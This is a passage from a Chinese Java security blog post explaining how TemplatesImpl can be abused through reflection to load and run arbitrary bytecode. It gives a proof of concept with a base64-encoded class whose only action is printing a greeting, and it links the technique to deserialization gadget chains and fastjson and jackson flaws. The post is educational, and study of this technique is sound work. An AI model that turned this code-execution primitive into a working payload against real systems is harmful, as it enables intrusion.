类即可~</p><p>简单的POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">public class HelloDefineClass &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">            byte[] code =  </span><br><span class="line">                Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;);  </span><br><span class="line">            TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);  </span><br><span class="line">            setFieldValue(obj, &quot;_name&quot;, &quot;Ku1s-&quot;);  </span><br><span class="line">            setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">            obj.newTransformer();  </span><br><span class="line">        &#125;  </span><br><span class="line">        public static void setFieldValue(Object obj,String name, Object value) throws NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(name);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj,value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中 ，setFieldValue 方法用来设置私有属性，可见，这里我设置了三个属性： _bytecodes 、 _name 和 _tfactory 。 _bytecodes 是由字节码组成的数组； _name 可以是任意字符串，只要不为null即可； _tfactory 需要是一个 TransformerFactoryImpl 对象，因为 TemplatesImpl#defineTransletClasses() 方法里有调用到 _tfactory.getExternalExtensionsMap() ，如果是null会出错</p><p>但有个点需要注意 TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。<br>分析下具体原因：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private int _transletIndex = -1;</span><br><span class="line">..............................</span><br><span class="line"></span><br><span class="line">if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"> else &#123;</span><br><span class="line">    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (_transletIndex &lt; 0) &#123;</span><br><span class="line">   ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">   throw new TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在defineTransletClasses()中，else中的_auxClasses默认值为null，所以调用put方法后就会报错，而且_transletIndex 默认值为-1，即使给_auxClasses赋值也会在下边的if处抛出异常从而报错，所以这里就需要进入if语句，而if中会判断父类名是否跟ABSTRACT_TRANSLET相同，跟进看下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static String ABSTRACT_TRANSLET</span><br><span class="line">= &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以在构造时就需要继承于<code>AbstractTranslet</code>，而<code>AbstractTranslet</code>是个抽象类就需要实现它未实现的接口，可以看到第一个的&#96;transform()</p><p>而<code>AbstractTranslet</code>还继承了<code>Translet</code>，<code>Translet</code>也有一个<code>transform()</code>没有实现，所以在这里就需要同时实现两个类的<code>transform()</code>，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM; </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException; </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; </span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler; </span><br><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123; </span><br><span class="line">public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125; </span><br><span class="line">public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125; </span><br><span class="line">public HelloTemplatesImpl() &#123; </span><br><span class="line">super();</span><br><span class="line">System.out.println(&quot;Hello TemplatesImpl&quot;); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它继承了 AbstractTranslet 类，并在构造函数里插入Hello的输出。将其编译成字节码，即可被 TemplatesImpl 执行了：<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/9.png" alt="one"></p><p>实测 jdk 66 无法执行， 而jdk 321 可以 ，在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影，这 个系列后文中仍然会再次见到它的身影。</p><h1 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h1><p>可以先参考 p 神的 [BCEL Cassloader](<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a>)</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
